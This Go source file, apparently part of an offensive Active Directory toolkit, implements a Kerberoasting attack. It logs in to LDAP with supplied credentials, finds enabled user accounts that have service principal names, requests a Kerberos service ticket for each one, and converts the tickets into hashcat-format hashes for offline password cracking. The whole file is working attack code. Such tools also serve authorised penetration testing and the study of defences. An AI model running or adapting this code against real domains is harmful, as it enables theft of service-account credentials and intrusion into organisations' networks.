package attacks

import (
	"fmt"
	"strings"

	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/ldap"
	"github.com/5amu/goad/pkg/utils"
)

const (
	ldapKerberoastableFilter = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*))"
)

type KerberoastOpts struct {
	User             string
	Realm            string
	Password         string
	DomainController string
	LdapPort         int
	LdapSSL          bool
	LdapSkipTLS      bool
}

func Kerberoast(opts *KerberoastOpts) ([]*kerberos.TGS, error) {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(opts.Realm, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    opts.DomainController,
		Realm:   opts.Realm,
		Port:    opts.LdapPort,
		BaseDN:  basedn,
		SkipTLS: opts.LdapSkipTLS,
		UseSSL:  opts.LdapSSL,
	}

	if err := ldapClient.Authenticate(opts.User, opts.Password); err != nil {
		return nil, err
	}
	defer ldapClient.Close()

	users, err := ldapClient.Search(ldapKerberoastableFilter, []string{"sAMAccountName", "servicePrincipalName"})
	if err != nil {
		return nil, err

	}

	krb, err := kerberos.NewKerberosClient(opts.Realm, opts.DomainController)
	if err != nil {
		return nil, err
	}
	krb.AuthenticateWithPassword(opts.User, opts.Password)

	var res []*kerberos.TGS
	for _, entry := range users.Entries {
		usr := entry.GetAttributeValue("sAMAccountName")
		spn := entry.GetAttributeValue("servicePrincipalName")
		tgs, err := krb.GetServiceTicket(usr, spn)
		if err != nil {
			return nil, err
		}
		res = append(res, &kerberos.TGS{
			Ticket:               tgs.Ticket,
			TargetUser:           usr,
			ServicePrincipalName: spn,
			Hash:                 utils.TGSToHashcat(tgs.Ticket, usr),
		})
	}
	return res, nil
}
